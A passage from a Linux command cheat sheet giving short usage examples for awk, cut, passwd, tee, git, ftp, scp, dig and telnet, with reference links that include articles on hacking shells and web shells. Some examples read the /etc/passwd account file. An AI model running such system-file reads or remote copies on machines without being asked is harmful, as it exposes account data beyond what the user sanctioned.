|awk -F: '{print $1}' /etc/passwd	|Print the first field of each line in the /etc/passwd file using colon as the field separator|
|||
|cut	|Extracts sections from each line of a file	|
|cut -f1,3 -d: /etc/passwd	|Extract the first and third fields of each line in the /etc/passwd file using colon as the field separator|
|cut -c1-5 file	|Extract the first five characters of each line in a file|
|cut -f2- file	|Extract all fields from the second field to the end of each line in a file|
|||
|passwd	|Change user password	|
|passwd	|Change the password for the current user|
|passwd username	|Change the password for the specified user|
|passwd -l username	|Lock the specified user's password, disabling login|
|passwd -u username	|Unlock the specified user's password, enabling login|
|||
|tee	|Read from standard input and write to standard output and files	|
|command \| tee file.txt	|Write the output of 'command' to both the console and the file 'file.txt'|
|command1 \| tee >(command2)	|Write the output of 'command1' to both the console and the input of 'command2'|
|command \| tee -a file.txt	|Append the output of 'command' to the end of the file 'file.txt'|
|||
|git	|Version control system for software development	|
|git init	|Initialize a new Git repository in the current directory|
|git clone [repository_url]	|Clone a Git repository from a remote URL|
|git add [file]	|Add a file to the staging area for the next commit|
|git commit -m "[commit_message]"	|Create a new commit with the changes in the staging area and a commit message|
|git push [remote] [branch]	|Push changes to a remote repository on a specific branch|
|git pull [remote] [branch]	|Pull changes from a remote repository on a specific branch|
|git merge [branch]	|Merge a branch into the current branch|
|||
|ftp	|File Transfer Protocol	|
|ftp hostname	|Connect to the FTP server with the specified hostname|
|ftp -u username hostname	|Connect to the FTP server with the specified username and hostname|
|ftp ftp://username@hostname	|Connect to the FTP server with the specified username and hostname using FTP URL syntax|
|||
|get remote-file [local-file]	|Download the remote file from the FTP server to the local system. If local-file is not specified, the file is downloaded to the current working directory with the same name.|
|put local-file [remote-file]	|Upload the local file to the FTP server. If remote-file is not specified, the file is uploaded to the current directory on the FTP server with the same name.|
|||
|scp	|Secure Copy	|
|scp [options] source destination	|Copy files securely between hosts on a network|
|scp file.txt user@192.168.0.10:/home/user/	|Copy the file.txt from the local system to the remote system at IP address 192.168.0.10 and save it to the /home/user/ directory.|
|scp user@192.168.0.10:/home/user/file.txt .	|Copy the file.txt from the remote system at IP address 192.168.0.10 to the current directory on the local system.|
|scp -r /path/to/local/dir user@remote:/path/to/remote/dir|	Recursively copy the local directory to the remote system.|
|||
|dig	|DNS lookup utility	|
|dig example.com	|Perform a DNS lookup for the domain name example.com|
|dig -x IP_address	|Perform a reverse DNS lookup for the given IP address|
|dig @DNS_server example.com	|Perform a DNS lookup using the specified DNS server|
|||
|telnet	|Remote login client	|
|telnet example.com	|Connect to the remote host example.com using the telnet protocol|
|telnet IP_address	|Connect to the remote host with the given IP address using the telnet protocol|
|telnet example.com port_number	|Connect to the specified port on the remote host example.com using the telnet protocol|


## Reference

https://www.geeksforgeeks.org/introduction-linux-shell-shell-scripting/

https://www.digitalocean.com/community/tutorials/different-types-of-shells-in-linux

https://www.geeksforgeeks.org/ssh-command-in-linux-with-examples/

https://www.geeksforgeeks.org/scp-command-in-linux-with-examples/

https://www.hackercoolmagazine.com/beginners-guide-to-shells-in-hacking/?srsltid=AfmBOoqcYf9xmcOgdDYsIdEko3sGu-sbhIjQoDEHlGdBOcjQ59AYJcso

https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/

